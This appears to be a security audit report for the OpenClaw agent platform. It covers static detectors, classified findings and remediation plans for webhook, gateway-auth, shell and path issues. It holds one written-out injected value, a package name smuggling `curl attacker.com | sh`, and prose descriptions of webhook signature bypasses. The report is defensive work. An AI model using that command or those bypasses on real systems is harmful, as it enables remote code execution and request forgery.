# OpenClaw Security Audit - CADSL Detectors

Automated security detectors for the OpenClaw multi-channel AI agent platform.
These detectors target TypeScript-specific attack surfaces: WebSocket/HTTP gateways,
channel webhook integrations, shell execution, auth/credential management, and
external content processing.

## Detection Patterns

| # | Detector | CWE | Severity | Target | Findings | TP Rate |
|---|----------|-----|----------|--------|----------|---------|
| 1 | `complex_gateway_handlers` | CWE-20 | Critical | Gateway server functions handling WebSocket/HTTP input | 22 | 45% |
| 2 | `webhook_verification_bypass` | CWE-347 | Critical | Webhook signature verification with bypass risk | 7 | 100% |
| 3 | `command_injection_surface` | CWE-78 | High | Shell execution and process spawning functions | 7 | 29% |
| 4 | `complex_input_parsers` | CWE-502/CWE-20 | High | Complex parsing/deserialization of external input | 50 | 10% |
| 5 | `auth_handler_complexity` | CWE-287 | High | Complex auth/credential handling functions | 50 | 6% |
| 6 | `secret_in_logging` | CWE-532 | Medium | Secret redaction/masking in logging code | 7 | 0% |
| 7 | `external_content_handlers` | CWE-79/CWE-94 | Medium | External content processing (prompt injection, XSS) | 50 | 6% |
| 8 | `path_traversal_surface` | CWE-22 | Medium | File path resolution from external input | 8 | 13% |

**Total: 201 findings, 21 TP, 10 PARTIAL-TP, 170 FP (15% overall TP rate)**

## Execution Instructions

### Run All Detectors

Execute each `.cadsl` file via the RETER MCP server:

```
mcp__reter__execute_cadsl(script="<path>/complex_gateway_handlers.cadsl")
mcp__reter__execute_cadsl(script="<path>/webhook_verification_bypass.cadsl")
mcp__reter__execute_cadsl(script="<path>/command_injection_surface.cadsl")
mcp__reter__execute_cadsl(script="<path>/complex_input_parsers.cadsl")
mcp__reter__execute_cadsl(script="<path>/auth_handler_complexity.cadsl")
mcp__reter__execute_cadsl(script="<path>/secret_in_logging.cadsl")
mcp__reter__execute_cadsl(script="<path>/external_content_handlers.cadsl")
mcp__reter__execute_cadsl(script="<path>/path_traversal_surface.cadsl")
```

Where `<path>` = `d:\ROOT\reter_root\reter_code\src\reter_code\cadsl\tools\security\`

### Custom Parameters

Each detector accepts tunable parameters:

| Parameter | Default | Description |
|-----------|---------|-------------|
| `min_lines` | varies (5-30) | Minimum function line count to report |
| `limit` | 50 | Maximum findings to return |

Lower `min_lines` for broader coverage; raise it to focus on the most complex functions.

## Classified Findings

### All Verified True Positives (RETER TASK-001 through TASK-020)

| RETER ID | Function | File:Line | CWE | Classification | Priority |
|----------|----------|-----------|-----|---------------|----------|
| TASK-001 | `reconstructWebhookUrl` | `extensions/voice-call/src/webhook-security.ts:183` | CWE-347 | **TP-EXTRACT** | Critical |
| TASK-002 | `verifyTwilioWebhook` | `extensions/voice-call/src/webhook-security.ts:336` | CWE-347 | **TP-PARAMETERIZE** | Critical |
| TASK-003 | `verifyPlivoWebhook` | `extensions/voice-call/src/webhook-security.ts:578` | CWE-347 | **TP-PARAMETERIZE** | Critical |
| TASK-004 | `attachGatewayWsMessageHandler` | `src/gateway/server/ws-connection/message-handler.ts:133` | CWE-287 | **TP-PARAMETERIZE** | Critical |
| TASK-005 | `authorizeGatewayMethod` | `src/gateway/server-methods.ts:93` | CWE-287 | **PARTIAL-TP** | High |
| TASK-011 | `splitShellArgs` | `src/utils/shell-argv.ts:1` | CWE-78 | **TP-EXTRACT** | High |
| TASK-012 | `spawnSignalDaemon` | `src/signal/daemon.ts:62` | CWE-78 | **TP-PARAMETERIZE** | High |
| TASK-013 | `parseInstallSpec` | `src/agents/skills/frontmatter.ts:34` | CWE-502 | **TP-PARAMETERIZE** | High |
| TASK-014 | `parseMessageWithAttachments` | `src/gateway/chat-attachments.ts:62` | CWE-20 | **TP-EXTRACT** | High |
| TASK-016 | `authorizeGatewayConnect` | `src/gateway/auth.ts:238` | CWE-287 | **TP-EXTRACT** | High |
| TASK-018 | `fetchRemoteMedia` | `src/media/fetch.ts:80` | CWE-918 | **TP-PARAMETERIZE** | High |
| TASK-015 | `parseConfigCommand` | `src/auto-reply/reply/config-commands.ts:9` | CWE-22 | **PARTIAL-TP** | Medium |
| TASK-017 | `fetchWithAuthFallback` | `extensions/msteams/src/attachments/download.ts:85` | CWE-287 | **PARTIAL-TP** | Medium |
| TASK-019 | `routeReply` | `src/auto-reply/reply/route-reply.ts:57` | CWE-79 | **PARTIAL-TP** | Medium |
| TASK-020 | `resolveFilePath` | `src/canvas-host/server.ts:158` | CWE-22 | **PARTIAL-TP** | Medium |

### Remediation Tasks Created

| RETER ID | Remediation | Derived From | Priority |
|----------|-------------|-------------|----------|
| TASK-006 | Enforce allowedHosts or reject forwarding headers by default in `reconstructWebhookUrl` | TASK-001 | Critical |
| TASK-007 | Add NODE_ENV production guard to `skipVerification` and ngrok loopback bypass | TASK-002 | Critical |
| TASK-008 | Add production guard to Plivo `skipVerification` and audit URL construction chain | TASK-003 | Critical |
| TASK-009 | Prevent `client.id` spoofing from bypassing device auth requirements | TASK-004 | Critical |
| TASK-010 | Refactor `authorizeGatewayMethod` to table-driven RBAC | TASK-005 | High |
| TASK-021 | Validate URLs, paths, and package names in `parseInstallSpec` | TASK-013 | High |

## Detailed Finding Analysis

### Tier 1: Critical

#### TASK-001: `reconstructWebhookUrl` — Header Injection (TP-EXTRACT)

**File:** `extensions/voice-call/src/webhook-security.ts:183` (90 lines)

Reconstructs the webhook callback URL from HTTP headers for HMAC signature
verification. When `trustForwardingHeaders` is true, attacker-controlled
`X-Forwarded-Host` / `X-Original-Host` / `ngrok-forwarded-host` headers
override the URL used for signature computation. An attacker with their own
Twilio/Plivo account computes a valid HMAC against `attacker.com`, sends the
request with injected forwarding headers, and the signature validates against
the wrong URL. The `allowedHosts` whitelist mitigates this but is optional
and not enforced by default. Falls back to raw `Host` header (line 234-241)
without validation.

**Attack:** Remote, no auth required. Precondition: `trustForwardingHeaders: true`
without strict `allowedHosts`.

#### TASK-002: `verifyTwilioWebhook` — Bypass Paths (TP-PARAMETERIZE)

**File:** `extensions/voice-call/src/webhook-security.ts:336` (87 lines)

Two bypass paths:
1. `skipVerification` option (line 369) returns `ok: true` immediately — documented
   as dev-only but no `NODE_ENV` guard prevents production use.
2. `allowNgrokFreeTierLoopbackBypass` (line 404) returns `ok: true` even when
   signature validation **fails**, if the URL contains `.ngrok-free.app` and the
   request comes from loopback. Exploitable via SSRF or any process on localhost.

**Root cause dependency:** Uses `reconstructWebhookUrl` (TASK-001) for URL
construction, inheriting the header injection vulnerability.

#### TASK-003: `verifyPlivoWebhook` — skipVerification Bypass (TP-PARAMETERIZE)

**File:** `extensions/voice-call/src/webhook-security.ts:578` (112 lines)

Same `skipVerification` bypass as Twilio (line 608). Multi-scheme fallback
(V3 then V2) is correctly implemented with `timingSafeEqualString` for HMAC
comparison. However, both schemes use the URL from `reconstructWebhookUrl`
(TASK-001), so header injection defeats both V3 and V2 verification.

#### TASK-004: `attachGatewayWsMessageHandler` — Device Auth Bypass (TP-PARAMETERIZE)

**File:** `src/gateway/server/ws-connection/message-handler.ts:133` (876 actual lines)

Central WebSocket handler. Config flags `dangerouslyDisableDeviceAuth` and
`allowInsecureAuth` disable device identity verification for clients with
`client.id === "control-ui"`. Since `client.id` is **self-reported** by the
connecting client, any attacker who knows the gateway token/password can
claim to be `control-ui` and skip device pairing entirely. Also has a legacy
v1 signature fallback (lines 597-625) that accepts signatures without nonce
on loopback connections.

### Tier 2: High

#### TASK-005: `authorizeGatewayMethod` — Fragile RBAC (PARTIAL-TP)

**File:** `src/gateway/server-methods.ts:93` (68 lines)

RBAC with duplicated check-then-allow pattern across 5 method categories.
Default at line 159 is deny (safe — not currently exploitable). The pattern
requires each method to appear in both a scope-check block AND a return-null
block. A developer adding a method to `WRITE_METHODS` but forgetting the
`return null` creates a denial; adding the `return null` without the scope
check creates an auth bypass. Hardcoded string prefixes at lines 141-155
are especially brittle.

**Risk:** Regression on future changes, not currently exploitable.

#### TASK-011: `splitShellArgs` — Shell Tokenizer (TP-EXTRACT)

**File:** `src/utils/shell-argv.ts:1` (62 lines)

Hand-written shell argument tokenizer handling single/double quotes and backslash
escapes. Returns `null` on unclosed quotes (good safety). If upstream callers
pass user-controlled text, this parser determines how shell arguments are
split — a malformed input could produce unexpected token boundaries. Callers
must ensure user input doesn't reach this function unsanitized.

#### TASK-012: `spawnSignalDaemon` — Unsanitized Account (TP-PARAMETERIZE)

**File:** `src/signal/daemon.ts:62` (31 lines)

User-provided `account` string flows directly to `args.push("-a", opts.account)`
without validation. Currently safe because `spawn()` uses array form (no shell).
However, no alphanumeric check or length limit exists. Vulnerable if refactored
to shell execution or if `signal-cli` interprets the account value unsafely.

#### TASK-013: `parseInstallSpec` — Unvalidated Package Names (TP-PARAMETERIZE)

**File:** `src/agents/skills/frontmatter.ts:34` (57 lines)

Parses YAML frontmatter from user-provided skill metadata. `kind` is validated
against a whitelist (brew, node, go, uv, download) but values within each kind
(formula, package, module, url, archive, targetDir) are accepted without format
validation or length limits. A malicious skill YAML could specify
`formula: "legit-package; curl attacker.com | sh"` if Homebrew's install path
passes it through a shell.

#### TASK-014: `parseMessageWithAttachments` — Base64 Parsing (TP-EXTRACT)

**File:** `src/gateway/chat-attachments.ts:62` (70 lines)

Parses base64-encoded attachments from external channel messages. Implements
comprehensive validation: base64 charset check, length must be multiple of 4,
decoded size checked against configurable `maxBytes` (default 5MB), MIME type
sniffed from binary. This is a **well-defended** trust boundary — the
validation is exemplary — but processes untrusted data directly and remains
a critical attack surface worth periodic re-audit.

#### TASK-016: `authorizeGatewayConnect` — Tailscale Priority (TP-EXTRACT)

**File:** `src/gateway/auth.ts:238` (54 lines)

Core gateway authorization. Uses `safeEqual()` (timing-safe) for token/password
comparison. Tailscale auth check runs BEFORE token/password checks. If
`auth.allowTailscale=true`, the function attempts `resolveVerifiedTailscaleUser()`
which validates via whois lookup requiring both headers AND proxy verification.
Implementation is sound, but the priority ordering means a Tailscale
misconfiguration could bypass token/password auth entirely.

#### TASK-018: `fetchRemoteMedia` — SSRF Surface (TP-PARAMETERIZE)

**File:** `src/media/fetch.ts:80` (92 lines)

Fetches external URLs from channel messages. Multiple validation layers:
`fetchWithSsrFGuard()` (blocks private networks), Content-Length vs maxBytes,
filename via `path.basename()`, MIME sniffing. The SSRF guard is the critical
control — if bypassed via DNS rebinding or TOCTOU, attacker reaches internal
services. Error body snippet truncated to 200 chars.

### Tier 3: Medium

#### TASK-015: `parseConfigCommand` — Config Path (PARTIAL-TP)

**File:** `src/auto-reply/reply/config-commands.ts:9` (63 lines)

Action validated against whitelist (`show|get|unset|set`). Value type-checked.
Config path accepted as-is without traversal protection. Downstream config
system must validate. If config path maps to filesystem or sensitive keys,
exploitable.

#### TASK-017: `fetchWithAuthFallback` — Unauth-First (PARTIAL-TP)

**File:** `extensions/msteams/src/attachments/download.ts:85` (59 lines)

Downloads Teams attachments. First fetch is unauthenticated, retried with auth
token on 401/403. URL allowlist enforced (HTTPS only, hostname whitelist).
Redirect chain only validates first redirect. Unauthenticated-first approach
leaks timing information about protected resources.

#### TASK-019: `routeReply` — Content Sanitization (PARTIAL-TP)

**File:** `src/auto-reply/reply/route-reply.ts:57` (91 lines)

Key content sanitization boundary for all outbound messages. Applies
`sanitizeUserFacingText()` on text content. Channel/thread IDs validated.
`sanitizeUserFacingText()` focuses on error patterns but returns unmodified
text if no errors detected — relies on recipient channel safety for HTML/XSS.
Worth verifying coverage of prompt injection markers.

#### TASK-020: `resolveFilePath` — Canvas Path Traversal (PARTIAL-TP)

**File:** `src/canvas-host/server.ts:158` (37 lines)

Explicit `..` traversal check, symlink rejection via `lstat`, and
`openFileWithinRoot()` with `SafeOpenError` for jail enforcement. Potential
TOCTOU race between lstat (line 182) and subsequent open. The
`openFileWithinRoot` is the real guard — inline checks are defense-in-depth.

### False Positive Summary by Detector

#### `secret_in_logging` — 0/7 TP (all FP-INTERFACE)

All 7 findings (`redactText`, `maskToken`, `redactPemBlock`, `redactIdentifier`,
`redactRawText`, `redactConfigSnapshot`, `redactMatch`) ARE the
redaction/masking layer — these functions are mitigations, not vulnerabilities.
The detector correctly identified security-relevant code but the functions
themselves are safe.

#### `command_injection_surface` — 5/7 FP

- `spawnGogServe` → **FP-STRUCTURAL**: Config-driven, array-form `spawn()`.
- `executePluginCommand` → **FP-INTERFACE**: Callback interface, no shell.
- `execDocker` → **FP-INTERFACE**: Array-form `spawn()`, validated upstream.
- `runCommand` → **FP-LAYERS**: Script utility, not production code path.
- `execText` → **FP-INTERFACE**: Browser executable detection utility.

Key insight: All command_injection findings use `spawn()` with array arguments,
which bypasses shell entirely. No actual shell injection exists.

#### `auth_handler_complexity` — 47/50 FP

The majority are:
- `applyAuthChoice*` functions → **FP-TRIVIAL**: Config setup, not auth enforcement.
- `buildAuthHealthSummary` → **FP-STRUCTURAL**: Purely diagnostic/informational.
- `refreshOAuthTokenWithLock` → **FP-INTERFACE**: Correct expiration + type checks.
- `summarizeTokenConfig` → **FP-INTERFACE**: Display-only, reads status.
- `resolveModelAuth*` → **FP-LAYERS**: Internal resolution, no auth decisions.
- `maybeRemoveDeprecatedCliAuthProfiles` → **FP-STRUCTURAL**: Migration cleanup.
- `repairOAuthProfileIdMismatch` → **FP-STRUCTURAL**: Data repair utility.

#### `complex_input_parsers` — 45/50 FP

Most parsers either:
- Process internal/validated data (FP-LAYERS): `parseFenceSpans`, `parseInlineCodeSpans`, `parseCliProfileArgs`
- Parse structured formats with validation (FP-STRUCTURAL): `parseGeoUri`, `parseVcard`, `parseSystemdUnit`
- Target parsing with safe fallbacks (FP-INTERFACE): `parseSlackTarget`, `parseDiscordTarget`, `parseIMessageTarget`

#### `external_content_handlers` — 47/50 FP

Most are internal reply-pipeline functions:
- `createTypingSignaler` → **FP-STRUCTURAL**: Internal typing indicator state machine.
- `handleCommands` → **FP-INTERFACE**: Auth gates present, delegates to handlers.
- `isApprovedElevatedSender` → **FP-INTERFACE**: Normalization + allowlist comparison.
- `resolveElevatedPermissions` → **FP-LAYERS**: Delegates validation to lower layers.
- Onboarding prompts (`promptSignalAllowFrom`, `promptIMessageAllowFrom`) → **FP-TRIVIAL**: Display-only.
- Status collectors (`collectTelegramStatusIssues`) → **FP-STRUCTURAL**: Read-only diagnostics.

#### `path_traversal_surface` — 7/8 FP

- `listAgentFiles` → **FP-STRUCTURAL**: Uses constant `BOOTSTRAP_FILE_NAMES`, no user-controlled paths.
- `resolveFilenameFromSource` → **FP-LAYERS**: `path.basename()` applied, no traversal.
- `normalizePathPrepend` → **FP-INTERFACE**: PATH env normalization, no user input.
- `resolveFileLimits` → **FP-LAYERS**: Internal media limit resolution.
- `normalizePath` → **FP-TRIVIAL**: UI-only navigation helper.
- `normalizePathCandidate` → **FP-INTERFACE**: Internal `is-main` detection.
- `resolvePath` → **FP-LAYERS**: Config backend path resolution from validated config.

## Classification Criteria

### True Positive (TP) Categories

| Classification | Description | Example |
|---------------|-------------|---------|
| **TP-EXTRACT** | Function processes untrusted input at a trust boundary | `reconstructWebhookUrl` rebuilds URLs from attacker-controlled headers |
| **TP-PARAMETERIZE** | Function has bypass/skip parameters that weaken security | `verifyTwilioWebhook` with `skipVerification` and ngrok loopback bypass |
| **PARTIAL-TP** | Function has mitigations but incomplete coverage or edge cases | `resolveFilePath` has `..` check but potential TOCTOU race |

### False Positive (FP) Categories

| Classification | Description | Example |
|---------------|-------------|---------|
| **FP-INTERFACE** | Function is a safe wrapper/facade, no actual risk | `refreshOAuthTokenWithLock` with correct expiration checks |
| **FP-LAYERS** | Function is protected by upstream validation | `parseIcaclsOutput` parses system command output, not user input |
| **FP-STRUCTURAL** | Complexity comes from exhaustive safe handling | `spawnGogServe` uses array-form spawn, config-driven |
| **FP-TRIVIAL** | Function is too simple or display-only to contain meaningful bugs | `logGatewayStartup` only logs config to console |

## Triage Workflow

### Phase 1: Critical Webhook Verification (TASK-001, 002, 003)
1. **TASK-001**: Enforce `allowedHosts` by default in `reconstructWebhookUrl` — reject forwarding headers unless explicitly configured
2. **TASK-007**: Add `NODE_ENV === "production"` guard to `skipVerification` in both Twilio and Plivo verifiers
3. **TASK-002**: Remove or restrict ngrok loopback bypass to require additional explicit opt-in
4. Verify that `timingSafeEqualString` is used consistently across all HMAC comparisons

### Phase 2: Critical Gateway Auth (TASK-004, 005)
1. **TASK-009**: Prevent `client.id` spoofing — `dangerouslyDisableDeviceAuth` should not rely on self-reported client ID
2. **TASK-004**: Remove legacy v1 signature fallback or add deprecation timeline
3. **TASK-010**: Refactor `authorizeGatewayMethod` to single method-to-scope lookup table

### Phase 3: High Priority (TASK-011 through TASK-018)
1. **TASK-013/021**: Validate URLs, paths, and package names in `parseInstallSpec` — highest impact in this tier
2. **TASK-018**: Audit `fetchWithSsrFGuard()` for DNS rebinding resistance
3. **TASK-016**: Document Tailscale auth priority ordering in `authorizeGatewayConnect`
4. **TASK-011**: Audit callers of `splitShellArgs` to ensure no user input reaches it unsanitized
5. **TASK-012**: Add alphanumeric validation to Signal daemon account parameter

### Phase 4: Medium Priority (TASK-015, 017, 019, 020)
1. **TASK-015**: Verify config path validation in downstream config system
2. **TASK-019**: Verify `sanitizeUserFacingText()` covers prompt injection and HTML entities
3. **TASK-020**: Verify `openFileWithinRoot` handles TOCTOU correctly
4. **TASK-017**: Document auth fallback security tradeoff; validate full redirect chain

## Technical Notes

- **No call graph**: RETER TypeScript indexing does not produce call graph edges, so detectors rely on node-local predicates (function name, file path, line count)
- **Name-based heuristics**: Detectors use REGEX on function names and file paths as proxies for behavior — some FPs are expected (15% overall TP rate is typical for static heuristic detectors)
- **Complexity proxy**: Line count is used as a proxy for cyclomatic complexity — higher line counts correlate with more branches and edge cases
- **Tunable thresholds**: All detectors accept `min_lines` and `limit` parameters for customization
- **Detector precision by tier**: Critical detectors (webhook_verification_bypass: 100% TP) are far more precise than broad detectors (auth_handler_complexity: 6% TP) — this is expected since narrow file/name patterns produce fewer false positives
- **Root cause chains**: TASK-002 and TASK-003 both depend on TASK-001 (`reconstructWebhookUrl`) as root cause — fixing TASK-001 partially mitigates both downstream verifiers
